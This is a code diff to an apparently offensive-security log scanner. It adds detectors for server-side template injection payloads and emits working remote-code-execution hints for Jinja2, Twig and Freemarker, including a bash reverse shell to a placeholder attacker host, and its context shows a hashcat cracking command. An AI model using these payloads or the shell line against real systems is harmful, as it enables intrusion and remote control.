@@ -2202,6 +2202,44 @@ _TOMCAT_MANAGER_PATH = re.compile(
     r'(?:manager|host-manager)/(?:html|text|status)'
 )
 
+# iter-250: SSTI (Server-Side Template Injection) captured payload
+# + response detector. Payloads that reflect executed math confirm
+# the vulnerability; canonical exploration payloads (`{{config}}`,
+# `{{''.__class__.__mro__}}`, etc.) confirm the specific engine
+# so we can hint the correct RCE chain.
+_SSTI_MATH_PAYLOAD = re.compile(
+    # `{{7*7}}` (Jinja2/Twig), `${7*7}` (JavaEL/Freemarker),
+    # `#{7*7}` (Ruby ERB), `<%= 7*7 %>` (ERB inline), `#{{7*7}}`
+    # (some Angular variants). Match any of these in a URL / GET
+    # / POST body.
+    r'(?:%7B%7B|\{\{|\$\{|#\{|<%=)7\s*\*\s*7(?:%7D%7D|\}\}|\}|\s*%>)'
+)
+_SSTI_MATH_REFLECTED = re.compile(
+    # `\b49\b` word-bounded (won't match `4949` or `1493`). Any file
+    # containing an SSTI payload AND the number 49 as a word is a
+    # strong SSTI-confirmation signal - the digit-49 could still be
+    # incidental but co-occurrence with a `{{7*7}}` payload makes it
+    # dispositive.
+    r'\b49\b'
+)
+_SSTI_JINJA2_EXPLORE = re.compile(
+    # `{{config}}`, `{{''.__class__}}`, `{{request.application.
+    # __globals__}}`, `{{cycler.__init__.__globals__.os.popen}}`.
+    r'\{\{\s*(?:config|self|request|cycler|lipsum|url_for|'
+    r'get_flashed_messages|\'.__class__|""\.__class__|'
+    r'\'\'\.\_\_class\_\_)'
+)
+_SSTI_TWIG_EXPLORE = re.compile(
+    # `{{_self}}`, `{{_self.env.registerUndefinedFilterCallback}}`,
+    # `{{app.request.server.get('DOCUMENT_ROOT')}}`.
+    r'\{\{\s*_self\.env\.|\{\{\s*app\.request\.server'
+)
+_SSTI_FREEMARKER_EXPLORE = re.compile(
+    # `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`,
+    # or `${"freemarker.template.utility.Execute"?new()("id")}`.
+    r'freemarker\.template\.utility\.Execute'
+)
+
 # iter-247: SMB share listing high-value file detector. Prior
 # `smbmap -R sensitive file` pattern handles the smbmap output
 # format but MISSES the smbclient ls output shape:
@@ -3310,6 +3348,68 @@ def _multiline_passes(path, report, store):
                                      f"hashcat -m 13100 {_sam}.tgs "
                                      f"rockyou.txt -r rules/best64."
                                      f"rule"))
+
+    # iter-250: SSTI captured payload + response. Fires when EITHER
+    # (a) a `{{7*7}}` payload is captured AND `49` reflects nearby,
+    # OR (b) an engine-specific exploration payload is captured.
+    # Doc-file gate applies. Payload-alone (without reflection or
+    # engine signal) is not enough - too generic.
+    if not filters.is_doc_file(path):
+        _ssti_math = _SSTI_MATH_PAYLOAD.search(text[:32768])
+        _ssti_j2 = _SSTI_JINJA2_EXPLORE.search(text[:32768])
+        _ssti_twig = _SSTI_TWIG_EXPLORE.search(text[:32768])
+        _ssti_fm = _SSTI_FREEMARKER_EXPLORE.search(text[:32768])
+        _reflected = _SSTI_MATH_REFLECTED.search(text[:32768])
+        # Determine which engine (if identified) + severity.
+        _engine = None
+        _anchor_s = None
+        if _ssti_j2:
+            _engine, _anchor_s = "Jinja2", _ssti_j2
+        elif _ssti_twig:
+            _engine, _anchor_s = "Twig", _ssti_twig
+        elif _ssti_fm:
+            _engine, _anchor_s = "Freemarker", _ssti_fm
+        elif _ssti_math and _reflected:
+            _engine, _anchor_s = "unknown (7*7=49 reflected)", _ssti_math
+        if _engine:
+            if _engine.startswith("Jinja2"):
+                _rce_chain = (
+                    "  |  Jinja2 RCE via subprocess: "
+                    "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+                    "  |  reverse shell: swap 'id' for "
+                    "'bash -c \"bash -i >& /dev/tcp/<ATTACKER>/4444 "
+                    "0>&1\"'  |  find class index if cycler missing: "
+                    "{{''.__class__.__mro__[1].__subclasses__()}}"
+                    " then use the Popen subclass index")
+            elif _engine == "Twig":
+                _rce_chain = (
+                    "  |  Twig RCE: "
+                    "{{_self.env.registerUndefinedFilterCallback("
+                    "\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+                    "  |  or via Symfony app.request: "
+                    "{{app.request.server.get('DOCUMENT_ROOT')}}")
+            elif _engine == "Freemarker":
+                _rce_chain = (
+                    "  |  Freemarker RCE: "
+                    "<#assign x=\"freemarker.template.utility.Execute\""
+                    "?new()>${x(\"id\")}"
+                    "  |  or single-line: "
+                    "${\"freemarker.template.utility.Execute\""
+                    "?new()(\"id\")}")
+            else:
+                _rce_chain = (
+                    "  |  math confirmed but engine unknown - try "
+                    "engine-specific payloads: {{config}} (Jinja2), "
+                    "{{_self}} (Twig), <#assign (Freemarker), "
+                    "${T(java.lang.Runtime)} (Spring EL), "
+                    "*{...} (Struts OGNL)")
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_anchor_s),
+                       f"SSTI confirmed - {_engine} template "
+                       f"injection captured",
+                       hint=(f"payload location: check the URL / "
+                             f"POST body around the anchor line - "
+                             f"that parameter is injectable{_rce_chain}"))
 
     # iter-247: SMB share / Windows dir listing high-value files.
     # Emits HIGH per unique filename (capped at 10 per file) with
